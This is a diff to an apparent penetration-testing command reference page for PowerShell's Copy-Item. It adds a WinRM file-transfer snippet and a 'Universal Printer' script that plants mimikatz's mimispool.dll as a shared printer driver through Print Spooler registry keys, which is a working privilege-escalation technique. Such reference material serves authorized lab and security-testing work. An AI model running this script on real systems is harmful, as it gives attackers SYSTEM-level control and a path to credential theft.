@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=copy-item) · [All tools](/index)
+
 ## Commands
 
 **Windows PowerShell**
@@ -25,8 +27,68 @@ The remote session uses your current account unless you supply credentials.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=Copy-Item)
+## Notebook recipes
 
-## Learning and original examples
+2 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="PowerShell Remoting (WinRM) Transfers">
+
+### PowerShell Remoting (WinRM) Transfers
+
+**File Transfers for Linux and Windows**
+
+```powershell
+# Test connectivity
+Test-NetConnection -ComputerName DATABASE01 -Port 5985
+
+# Create a session
+$Session = New-PSSession -ComputerName DATABASE01
+
+# Copy file TO remote machine
+Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+
+# Copy file FROM remote machine
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+</Accordion>
+
+<Accordion title="Universal Printer">
+
+### Universal Printer
+
+**Windows Privilege Escalation: Full Checklist**
+
+```ps1
+$printerName     = 'Universal Priv Printer'
+$system32        = $env:systemroot + '\system32'
+$drivers         = $system32 + '\spool\drivers'
+$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
+ 
+Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
+Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
+Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
+ 
+Add-PrinterDriver -Name       'Generic / Text Only'
+Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared
+ 
+New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null
+New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
+New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
+New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
+New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null
+```
+
+</Accordion>
+
+</AccordionGroup>
